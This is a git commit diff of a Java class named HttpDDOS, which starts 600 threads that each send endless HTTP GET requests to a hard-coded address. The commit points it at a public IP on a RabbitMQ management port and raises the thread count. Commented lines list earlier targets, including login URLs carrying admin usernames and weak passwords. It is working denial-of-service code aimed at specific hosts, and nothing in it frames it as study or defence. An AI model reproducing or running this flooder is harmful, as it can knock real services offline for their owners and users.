38a65654bbedbaee35b2899ea0c0c99b27f280b8
翘楚 <1012191814@qq.com>
2021-06-11 08:30:16 +0800

    init

--- src/main/java/com/sun/http/HttpDDOS.java
+++ src/main/java/com/sun/http/HttpDDOS.java
@@ -11,12 +11,14 @@ public class HttpDDOS implements Runnable {
         while (true) {
             //String URL = "http://175.19.155.39/chk/gainchkcode.do?custno=1&username=a&password2=1";
             //String URL = "http://172.16.0.146:8086/eMWX2.0-YT/ex/user/login.do?userid=admin&pwd=e10adc3949ba59abbe56e057f20f883e&dynamic_code=&client_token=&host=";
-            String URL = "http://172.16.1.108:8084/eMWX2.0-TM/ex/user/login.do?userid=admin&pwd=e10adc3949ba59abbe56e057f20f883e&dynamic_code=&client_token=&host=";
+            //String URL = "http://172.16.1.108:8084/eMWX2.0-TM/ex/user/login.do?userid=admin&pwd=e10adc3949ba59abbe56e057f20f883e&dynamic_code=&client_token=&host=";
             //String URL = "http://172.16.0.146:8066/project/eMWX2.0-YT/";
             //String URL = "http://8.131.66.1:15672/login?username=admin&password=123456";
+            //String URL = "http://8.131.66.1";
+            String URL = "http://8.131.66.1:15672/";
             HttpUtil.doGet(URL);
             try {
-                Thread.sleep(500);
+                Thread.sleep(1000);
             } catch (InterruptedException e) {
                 e.printStackTrace();
             }
@@ -29,7 +31,7 @@ class Main1 {
 
     public static void main(String[] args) {
 
-        for (int i = 0; i < 500; i++) {
+        for (int i = 0; i < 600; i++) {
             HttpDDOS main = new HttpDDOS();
             Thread thread = new Thread(main);
             thread.start();
